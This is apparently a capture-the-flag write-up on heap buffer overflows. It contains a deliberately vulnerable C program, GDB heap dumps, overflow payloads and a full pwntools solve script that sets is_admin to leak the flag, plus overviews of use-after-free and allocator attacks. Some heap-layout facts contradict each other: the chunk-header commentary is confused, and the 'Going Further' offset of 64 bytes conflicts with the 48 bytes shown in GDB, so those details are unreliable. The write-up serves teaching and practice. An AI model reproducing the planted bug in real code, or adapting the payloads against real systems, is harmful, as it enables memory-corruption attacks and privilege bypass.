---
title: "Pwn - Heap Overflow"
description: "Exploiting a heap buffer overflow to corrupt adjacent objects and hijack program logic — an introduction to heap exploitation."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                          |
|------------|--------------------------------|
| Category   | Binary Exploitation            |
| Difficulty | Hard                           |
| Points     | 450                            |
| Flag       | `zemi{h34p_0v3rfl0w_ftw}`      |

## Challenge Files

Download the challenge files to get started:

- [heap.c](/Website/challenges/pwn-heap-overflow/heap.c)
- [Makefile](/Website/challenges/pwn-heap-overflow/Makefile)
- [flag.txt](/Website/challenges/pwn-heap-overflow/flag.txt)

## Introduction

All the exploitation techniques we have covered so far target the **stack** — overflowing local variables, overwriting return addresses, building ROP chains. But programs also allocate memory on the **heap** using `malloc()` and `free()`. Heap memory has its own internal data structures, and corrupting them opens an entirely different class of attacks.

In this challenge, we exploit a **heap buffer overflow**: writing past the end of a heap-allocated buffer to corrupt an adjacent object's data. This is conceptually similar to a stack buffer overflow, but the target is heap memory instead of the stack.

## How Heap Memory Works

### malloc and free

When a program calls `malloc(size)`, the heap allocator (typically **ptmalloc2** on Linux, part of glibc) returns a pointer to a block of memory of at least `size` bytes. Internally, the allocator manages memory in **chunks**.

Each chunk has a header (metadata) followed by the user data:

```
+---------------------------+
| prev_size (8 bytes)       |  <- only used if previous chunk is free
+---------------------------+
| size + flags (8 bytes)    |  <- chunk size, plus 3 flag bits (A, M, P)
+---------------------------+
| user data                 |  <- the pointer returned by malloc
| ...                       |
+---------------------------+
```

The `size` field includes the metadata and is always aligned to 16 bytes. The three lowest bits are flags:
- **P (PREV_INUSE)**: previous chunk is in use
- **M (IS_MMAPPED)**: chunk was allocated via mmap
- **A (NON_MAIN_ARENA)**: chunk belongs to a non-main arena

### Chunk Layout in Memory

When you do consecutive `malloc()` calls, chunks are placed adjacently on the heap:

```
Heap grows upward (toward higher addresses)

+-------------------+
| Chunk A header    |
| Chunk A data      |  <- malloc(32) returns this
+-------------------+
| Chunk B header    |
| Chunk B data      |  <- malloc(32) returns this
+-------------------+
| Chunk C header    |
| Chunk C data      |  <- malloc(32) returns this
+-------------------+
| Top chunk         |
+-------------------+
```

If we overflow Chunk A's data, we write into Chunk B's header and data. This is the heap overflow.

### Free and Bins

When `free()` is called, the chunk is placed into a **bin** (a linked list of free chunks) for later reuse. Different sized chunks go into different bins:

- **Tcache** (thread-local cache): fast, per-thread, for recent frees (glibc 2.26+)
- **Fast bins**: small chunks (up to 160 bytes), singly-linked LIFO
- **Unsorted bin**: recently freed chunks of any size
- **Small bins**: sorted by size, doubly-linked
- **Large bins**: for large allocations, sorted by size

Understanding bins is crucial for advanced heap attacks, but this challenge focuses on a simpler overflow into adjacent data.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Compiled: gcc -no-pie -fno-stack-protector -o heapovf heapovf.c

struct User {
    char name[32];
    int is_admin;
};

struct Secret {
    char data[64];
};

int main() {
    printf("=== Heap Overflow Challenge ===\n");

    // Allocate two objects on the heap
    struct User *user = (struct User *)malloc(sizeof(struct User));
    struct Secret *secret = (struct Secret *)malloc(sizeof(struct Secret));

    // Initialize
    user->is_admin = 0;
    memset(user->name, 0, 32);

    // Load the flag into the secret object
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("flag.txt not found!\n");
        free(user);
        free(secret);
        return 1;
    }
    fgets(secret->data, 64, f);
    fclose(f);

    // Get user input — VULNERABLE: reads 128 bytes into 32-byte name field
    printf("Enter your name: ");
    read(0, user->name, 128);

    printf("Name: %s\n", user->name);
    printf("Admin: %d\n", user->is_admin);

    if (user->is_admin) {
        printf("Welcome admin! Here is the secret: %s\n", secret->data);
    } else {
        printf("Access denied. You are not admin.\n");
    }

    free(user);
    free(secret);
    return 0;
}
```

Key observations:
- Two heap objects: `User` (36 bytes: 32 name + 4 is_admin) and `Secret` (64 bytes)
- `read(0, user->name, 128)` reads 128 bytes into a 32-byte field — heap overflow
- We need `is_admin` to be non-zero to see the flag
- `is_admin` is right after `name` in the same struct, so overflowing `name` by even 1 byte sets `is_admin`

## Step 1 — Analyze the Heap Layout

Let's use GDB to examine the heap:

```bash
gdb ./heapovf
```

```gdb
(gdb) break main
(gdb) run
(gdb) next    # step past malloc calls

# After both mallocs:
(gdb) info proc mappings
# Find the heap region

(gdb) p user
$1 = (struct User *) 0x4052a0
(gdb) p secret
$2 = (struct Secret *) 0x4052d0

(gdb) p &user->name
$3 = (char (*)[32]) 0x4052a0
(gdb) p &user->is_admin
$4 = (int *) 0x4052c0
```

So the layout is:
- `user->name` starts at `0x4052a0` (32 bytes)
- `user->is_admin` is at `0x4052c0` (at offset 32 within the struct)
- `secret` starts at `0x4052d0`

The `is_admin` field is only 32 bytes from the start of `name`. We just need to write more than 32 bytes.

Let's examine the heap chunks:

```gdb
(gdb) x/20gx 0x4052a0-0x10
0x405290:   0x0000000000000000  0x0000000000000031  <- user chunk header (size=0x30=48)
0x4052a0:   0x0000000000000000  0x0000000000000000  <- user->name[0..15]
0x4052b0:   0x0000000000000000  0x0000000000000000  <- user->name[16..31]
0x4052c0:   0x0000000000000000  0x0000000000000051  <- user->is_admin | secret chunk header
0x4052d0:   0x0000000000000000  0x0000000000000000  <- secret->data
```

Interesting: `is_admin` (4 bytes at `0x4052c0`) shares the same 8-byte slot as the beginning of the secret chunk's header area. The actual chunk header for `secret` starts at `0x4052c8` (prev_size) and `0x4052c0` (well, `is_admin` is within the user struct's allocation).

Since malloc allocates at least the struct size (36 bytes, rounded up to 48 bytes with alignment and header), `is_admin` is well within our allocation. Writing 33+ bytes into `name` will overflow into `is_admin`.

## Step 2 — The Simple Overflow

This is straightforward. The `name` field is 32 bytes. The `is_admin` field is the next 4 bytes. We write 32 bytes of name + any non-zero value for `is_admin`:

```python
payload = b"A" * 32 + b"\x01"  # 32 bytes name + is_admin = 1
```

## Step 3 — Test the Theory

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\x01')" | ./heapovf
```

```
=== Heap Overflow Challenge ===
Enter your name: Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Admin: 1
Welcome admin! Here is the secret: zemi{h34p_0v3rfl0w_ftw}
```

## Step 4 — Verify in GDB

```gdb
(gdb) break *main+200     # break after read()
(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\x01')")

# Examine the heap after our input
(gdb) x/20bx user
0x4052a0: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41  <- AAAAAAAA
0x4052a8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41  <- AAAAAAAA
0x4052b0: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41  <- AAAAAAAA
0x4052b8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41  <- AAAAAAAA
0x4052c0: 0x01 0x00 0x00 0x00                        <- is_admin = 1 !

(gdb) p user->is_admin
$1 = 1
```

The `is_admin` field is now 1. The overflow worked.

## Full pwntools Solve Script

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('./heapovf')

# Start the process
p = process('./heapovf')

# Build the payload
# user->name is 32 bytes, followed by user->is_admin (4 bytes)
# We fill name and set is_admin to a non-zero value

name_size = 32
payload  = b"A" * name_size     # fill the name field
payload += p32(1)               # is_admin = 1

log.info(f"Payload size: {len(payload)} bytes")
log.info(f"Payload: {payload.hex()}")

# Send the payload
p.sendafter(b"name: ", payload)

# Receive output
output = p.recvall(timeout=3).decode()
print(output)

# Extract the flag
for line in output.split('\n'):
    if 'secret' in line.lower() or 'flag' in line.lower() or 'zemi{' in line:
        log.success(f"Flag line: {line.strip()}")

p.close()
```

```
[*] Payload size: 36 bytes
[+] Starting local process './heapovf': pid 22222
[+] Receiving all data: Done
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Admin: 1
Welcome admin! Here is the secret: zemi{h34p_0v3rfl0w_ftw}
[+] Flag line: Welcome admin! Here is the secret: zemi{h34p_0v3rfl0w_ftw}
```

## Going Further — Overflowing Into Adjacent Chunks

In more complex challenges, the overflow crosses chunk boundaries and corrupts the **next chunk's metadata or data**. Let's say the challenge required us to modify `secret->data` itself:

```python
# Overflow from user into secret
# Distance: user->name (32 bytes) + is_admin (4 bytes) + padding (12 bytes)
#         + secret chunk header (16 bytes) = 64 bytes to reach secret->data

payload  = b"A" * 32        # name
payload += p32(1)            # is_admin
payload += b"B" * 12         # padding to chunk boundary
payload += b"C" * 16         # overwrite secret chunk header (dangerous!)
payload += b"FAKE_SECRET"    # overwrite secret->data
```

Corrupting chunk headers is dangerous — it can crash the program when `free()` processes the corrupted chunk. Advanced heap exploitation techniques manipulate these headers deliberately to achieve arbitrary writes.

## Use-After-Free (UAF) — Concept Overview

A related heap vulnerability is **Use-After-Free**: using a pointer after the memory it points to has been freed.

```c
struct User *user = malloc(sizeof(struct User));
free(user);
// user pointer is now dangling

struct Admin *admin = malloc(sizeof(struct Admin));
// If admin is allocated in the same chunk user was in...
// admin and user point to the same memory!

user->is_admin = 1;  // this actually modifies admin's data!
```

After `free()`, the allocator may reuse the same memory for the next `malloc()` of similar size. If the old pointer (`user`) is still used, it accesses the new object's data. This is called a UAF and is one of the most common vulnerability classes in real-world software.

## Heap Exploitation Techniques Overview

For reference, here are common heap exploitation techniques (from simple to advanced):

| Technique          | Description                                        |
|--------------------|----------------------------------------------------|
| Heap overflow      | Write past heap buffer into adjacent chunks         |
| Use-after-free     | Access freed memory that has been reallocated       |
| Double free        | Free the same chunk twice to corrupt the free list  |
| Tcache poisoning   | Corrupt tcache linked list to get arbitrary alloc   |
| Fastbin dup        | Similar to double free but targeting fast bins      |
| House of Force     | Overflow the top chunk size for arbitrary alloc     |
| House of Spirit    | Free a fake chunk to get it into a bin              |
| House of Orange    | Abuse unsorted bin to get code execution            |
| House of Einherjar | Abuse backward consolidation for overlapping chunks |

Each technique exploits different aspects of the heap allocator's internal data structures. This challenge covers the first and simplest — the heap overflow.

## Debugging Heap with GDB

Useful GDB commands for heap analysis:

```gdb
# Using pwndbg (GDB plugin)
(gdb) heap                    # show all heap chunks
(gdb) bins                    # show all bins (tcache, fast, unsorted, small, large)
(gdb) vis_heap_chunks         # visual representation of heap chunks
(gdb) malloc_chunk 0x4052a0   # inspect a specific chunk

# Using GEF (another GDB plugin)
gef> heap chunks              # list all chunks
gef> heap bins                # show bin contents

# Manual inspection
(gdb) x/4gx 0x4052a0-0x10    # view chunk header + start of data
```

Install pwndbg for the best heap debugging experience:

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

## Tools Used

- **GDB + pwndbg** — inspect heap layout, chunk headers, and bin states
- **pwntools** — craft payloads, interact with the process
- **checksec** — verify binary protections
- **Python** — scripting the exploit

## Lessons Learned

- **Heap overflows** are conceptually similar to stack overflows — writing past a buffer into adjacent data — but target dynamically allocated memory
- Heap chunks are placed **adjacently** in memory; overflowing one corrupts the next
- The heap allocator maintains **metadata** (size, flags, linked list pointers) in chunk headers — corrupting these can crash or be exploited
- **Use-after-free** is a related class where freed memory is reused, allowing type confusion between old and new objects
- Unlike stack overflows, heap exploitation often requires understanding the **specific allocator** (ptmalloc2, jemalloc, etc.)
- Modern heap protections include **tcache double-free detection**, **safe unlinking**, and **pointer mangling** — each requiring different bypass techniques
- Heap bugs are among the most common vulnerabilities in real-world software (browsers, kernels, servers) because complex programs heavily use dynamic memory allocation
- Start with pwndbg or GEF for heap debugging — raw GDB is painful for heap analysis
